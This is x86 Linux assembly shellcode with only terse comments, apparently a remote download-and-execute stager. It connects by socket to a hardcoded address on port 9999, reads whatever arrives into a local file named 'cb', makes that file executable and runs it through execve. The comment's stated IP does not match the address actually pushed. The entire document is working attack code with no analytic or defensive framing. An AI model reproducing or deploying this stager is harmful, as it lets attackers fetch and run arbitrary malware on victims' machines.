global _start

_start:

xor ecx,ecx
mul ecx
xor ebx,ebx
cdq

;socket
push eax
push byte 0x1
push byte 0x2
mov ecx,esp
inc ebx
mov al,0x66
int 0x80
mov edi,eax             ;edi=sockfd


;connect,port(9999)=270f ip(140.115.53.35)=(8c.73.35.23)  
push edx
push long 0x017aa8c0     ;address *
push word 0x0f27        ;port    * 
mov dl,0x02
push dx                 ;family  1
mov ecx,esp              ;adjust struct
push byte 0x10
push ecx   
push edi                ;sockfd
mov ecx,esp             
mov bl,3                
mov al,102
int 0x80

;sys_open(cb,O_WRONLY|O_CREATE|O_TRUNC[0001.0100.1000=1101],700)
xor ebx,ebx
xor ecx,ecx
push ecx
push word 0x6263        ;file name="cb" 
mov ebx,esp
mov cx,0x242            
mov dx,0x1c0            ;Octal
mov al,5
int 0x80
mov esi,eax             ;esi=fd


;
xor ecx,ecx
mul ecx
cdq
mov dx,0x03e8         ;memory chunk=1000=0x03e8: read per time       
    
L1:                         
;sys_read(socket sockfd,buf,len)            
xor ebx,ebx
xor eax,eax
mov al,3
mov ebx,edi            ;edi=sock fd
lea ecx,[esp-1000]      ;memory chunk
int 0x80
;sys_write(fd,*buf,count)
mov ebx,esi               
mov edx,eax              
xor eax,eax
mov al,4
int 0x80
cmp dx,0x03e8          
je L1                  ;loop


CONTINUE:
;sys_close(fd)
mov ebx,esi             
xor eax,eax
mov al,6
int 0x80

;execve[./cb,0]      
xor ecx,ecx
mul ecx
push ecx
push word 0x6263       ;file name="cb" 
mov ebx,esp
push ecx
push ebx                  
mov ecx,esp              
mov al,0x0b
int 0x80


EXIT:
xor eax,eax
xor ebx,ebx 
inc eax
int 0x80

